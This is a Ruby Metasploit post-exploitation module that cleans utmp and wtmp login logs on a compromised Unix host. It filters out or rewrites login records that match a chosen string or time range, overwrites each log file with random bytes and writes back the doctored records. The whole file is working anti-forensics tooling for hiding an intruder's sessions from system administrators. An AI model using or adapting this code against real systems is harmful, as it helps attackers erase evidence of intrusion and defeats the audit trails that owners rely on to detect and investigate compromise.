#$LOAD_PATH.push File.expand_path(File.join(Msf::Config.staekka_path, 'external', 'bindata', 'lib' ))

require 'bindata'
require 'time'
require 'ipaddr'
require 'tempfile'

require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/utmp'
require 'core/post/unix/commands'


class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Utmp Logfiles Cleaner',
        'Description'   => %q(Clear utmp  log files),
        'Author'        => [ 'jot'],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options(
      [
        OptBool.new('USE_UPDATEDB',  [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('STRING',  [ false, 'A string to be removed from the log files']),
        OptString.new('REPLACE',  [ false, 'A string for replacing the original string (if empty logentries will be removed)']),
        OptString.new('FILES',  [ false, 'A special log file']),
        OptBool.new('LOCALEDIT',  [ false, 'Edit text dump in local editor', false]),
        OptString.new('REMOVETIME_START',  [ false, 'Delete all entries between REMOVETIME_START and REMOVETIME_STOP ']),
        OptString.new('REMOVETIME_STOP',  [ false, 'Delete all entries between REMOVETIME_START and REMOVETIME_STOP ']),
      ], self.class)
  end

  def run
    time_min = nil
    time_max = nil
    string = datastore['STRING'].to_s.strip
    if string.empty? and datastore['REMOVETIME_START'].to_s.strip.empty?
      print_error('String empty')
      raise ArgumentError
    end
    replace = datastore['REPLACE'].to_s.strip
    localedit = datastore['LOCALEDIT']

    if datastore['REMOVETIME_START'] and datastore['REMOVETIME_STOP']
      begin
        time_min = Time.parse(datastore['REMOVETIME_START'])
        time_max = Time.parse(datastore['REMOVETIME_STOP'])
      rescue
        print_error "Wrong time format. Information about format: Time.parse (http://ruby-doc.org/stdlib-2.2.3/libdoc/time/rdoc/Time.html#method-c-parse)"
        raise ArgumentError
      end
    end

    all_log_files.each do |file|
      logformat = nil
      tmpfile = nil
      attr = nil
      ################
      # check file permissions
      next unless  permissions?(file)
      ################
      # size check/warning
      size = filesize(file)
      if size.nil? || size == 0
        vprint_warning "#{file}: not readable or empty"
        next
      elsif size > 1024 * 1024 * 1024 # 1G
        print_error "#{file}: file size (#{size}) more than 1 G: This would fail and crash the session! Cannot download"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 100  # 100 MB
        print_warning "#{file}: file size (#{size}) more than 100Mb: This will need long time and lot of recourses"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 10           # 10 MB
        # 10 MB
        print_warning "#{file}: file size (#{size}) more than 10Mb: This will need a while"
      elsif size > 1024 * 1024                # 1MB
        print_warning "#{file}: file size (#{size}) more than 1Mb: This might need some time"
      else                                    # less
        # OK
      end

      ################
      # timestamp
      #tmpfile = touch_tmpfile(file)
      ###############
      # logfile?
      #dump_utmp(file)
      clean = clear_utmp(file, string, replace, localedit, time_min, time_max)
      if clean.nil?
        print_error "Empty output: something might be wrong. check manualy!"
        next
      end
      ##################
      # overwrite file
      random_data = ::Rex::Text.rand_text_alpha(size)
      random_data <<  "\x00" * 256
      write_file(file, random_data)
      ##################
      # write file
      write_file(file, clean)
    end
  end

  def all_log_files
    out = []
    if datastore['FILES']
      files = datastore['FILES'].split(" ")
    else
      files = log_files_utmp
    end

    files.flatten!
    files.compact!
    files.uniq!

    files.each do |file|
      file.strip!
      next if file.empty?
      if (file.start_with? '/') or  (file.start_with? './') or (file.start_with? '..')
        if exists?(file)
          out << file
        end
      else
        # search updatedb
        out.concat find_files(file)
      end
    end
    out
  end

  def log_files_utmp
    [ "/var/log/wtmp",          # Linux
      "/var/run/utmp",          # Linux
      "/var/adm/utmpx",      # Solaris
      "/var/adm/wtmpx",     # Solaris
      "/etc/utmp",
      "/etc/utmpx",
      "/etc/wtmp",
      "/etc/wtmpx",
      "/usr/adm/utmp",
      "/usr/adm/utmpx",
      "/usr/adm/wtmp",
      "/usr/adm/wtmpx",
      "/usr/run/utmpx",
      "/usr/var/adm/utmp",
      "/usr/var/adm/utmpx",
      "/usr/var/adm/wtmp",
      "/usr/var/adm/wtmpx",
      "/var/adm/utmp",
      "/var/adm/wtmp",
      "/var/log/utmp",
      "/var/log/utmpx",
      "/var/log/wtmpx",
      "/var/run/utmpx",
      "/var/run/wtmp",
      "/var/run/wtmpx",
    ]
  end

  def permissions?(file)
    if (readable?(file)) and (writeable?(file))
      true
    else
      print_error "read permissions: #{readable?(file)}"
      print_error "write permissions: #{writeable?(file)}"
      print_error "Need read and write permissions for #{file} for changing it! Cannot go on"
      print_error "This could also be a known bug of this check. In this case you simply need to re-run this module"
      false
    end
  end

  def get_utmp_type(logfile)
    [UtmpLinux.new, UtmpFreeBSD.new, UtmpBSD.new].each do |utmp|
      if utmp.size_ok?(logfile.size)
        if utmp.check_structure(logfile)
          return utmp
        end
      end
    end
    nil

  end

  def dump_utmp(file)
    logfile = ::File.new("/tmp/_utmp.tmp")
    utmp = get_utmp_type(logfile)
    if utmp.nil?
      print_error "Unkown UTMP structure for #{file}"
      return
    end
    utmp.each_entry(logfile) do | utmp, data |
      print_info utmp.print_entry(data)
    end
  end

  def clear_utmp(file, string, replace=nil, do_edit=false, time_min=nil, time_max=nil)
    rx = Regexp.new(string)
    clean_data =  ''
    logfile = StringIO.new(read_file(file, true, false))
    utmp = get_utmp_type(logfile)
    if utmp.nil?
      print_error "Unkown UTMP structure for #{file}"
      return
    end

    tmpdata  = StringIO.new
    if do_edit == true
      editor = Rex::Compat.getenv('EDITOR') || 'vi'
      edit_file = Tempfile.new('utmp')
      edit_file.print utmp.print_lines(logfile)
      edit_file.close
      system("#{editor} #{edit_file.path}")
      tmpdata  = StringIO.new(::File.read edit_file.path)
    else
      utmp.print_lines(logfile).each_line do |line|
        if rx.match(line)
          if (time_min) and (time_max)
            if line.match(/ut_tv_sec=\[(.*?)\]/)
              line_time = $1
            elsif line.match(/ut_time=\[(.*?)\]/)
              line_time = $1
            else
              line_time = nil
            end
            if line_time
              begin
                logtime = Time.parse(line_time)
                unless (logtime >= time_min) and (logtime <= time_max)
                  tmpdata << line
                end
              rescue
                vprint_status "[ERROR] in parsing time (#{$1})"
                tmpdata << line
              end
            else
              vprint_status "[ERROR] in parsing time"
              tmpdata << line
            end
          elsif replace.to_s.empty?
            vprint_status "Found string='#{string}' so I am removing this line:\n#{line}"
          else
            tmpdata << line.gsub(/#{string}/, replace)
          end
        else
          tmpdata << line
        end
      end
    end
    tmpdata.rewind
    new_data = utmp.text_to_bin(tmpdata)
    new_data.each do |utmp|
      clean_data << utmp.to_binary_s
    end
    clean_data
  end
end
